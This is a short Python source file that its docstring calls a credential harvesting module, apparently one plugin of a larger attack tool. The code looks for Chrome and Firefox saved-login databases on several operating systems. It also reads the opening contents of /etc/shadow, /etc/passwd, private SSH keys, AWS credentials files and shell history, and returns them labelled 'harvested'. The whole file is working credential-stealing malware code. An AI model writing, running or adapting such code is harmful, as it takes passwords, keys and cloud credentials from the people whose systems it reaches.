"""Credential harvesting module."""
import os, json, time
def run(args):
    target = args.get('target', 'browser') if isinstance(args, dict) else 'browser'
    results = []
    if target == 'browser':
        try:
            paths = [
                os.path.expanduser('~/Library/Application Support/Google/Chrome/Default/Login Data'),
                os.path.expanduser('~/.config/google-chrome/Default/Login Data') if os.name != 'nt' else os.path.expandvars('%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data'),
                os.path.expandvars('%APPDATA%\\Mozilla\\Firefox\\Profiles'),
                os.path.expanduser('~/Library/Application Support/Firefox/Profiles'),
            ]
            for p in paths:
                if os.path.exists(p):
                    results.append({'path': p, 'status': 'found'})
        except Exception:
            pass
    elif target == 'files':
        candidates = [
            '/etc/passwd',
            '/etc/shadow',
            os.path.expanduser('~/.ssh/id_rsa'),
            os.path.expanduser('~/.aws/credentials'),
            os.path.expanduser('~/.bash_history'),
        ]
        for c in candidates:
            if os.path.exists(c):
                try:
                    with open(c, 'r', errors='replace') as f:
                        snippet = f.read(400)
                    results.append({'path': c, 'snippet': snippet})
                except Exception:
                    pass
    return {'status': 'harvested', 'target': target, 'count': len(results), 'items': results, 'type': 'creds'}
